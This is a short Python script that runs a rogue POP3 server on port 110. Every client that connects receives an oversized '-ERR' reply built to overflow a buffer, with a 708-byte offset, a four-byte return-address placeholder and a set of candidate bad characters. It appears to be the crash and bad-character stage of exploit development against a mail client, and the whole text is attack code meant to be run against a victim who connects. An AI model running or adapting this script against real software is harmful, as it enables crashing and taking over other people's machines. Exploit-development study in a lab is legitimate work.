
import socket

badchars = ("\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


crash  = "A" * 708
crash += "B" * 4
crash += badchars
crash += "C" * (2000 - len(crash))

payload = "-ERR " + crash

# set up listener on port 110
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 110))
        s.listen(1)
        print ("[*] Listening on port 110.")
        print ("[*] Have someone connect to you.")
        print ("[*] Type <control>-c to exit.")
        conn, addr = s.accept()
        print '[*] Received connection from: ', addr

        while 1:
                conn.send(payload)
        conn.close()
except:
        print ("[*] Connection issue!")

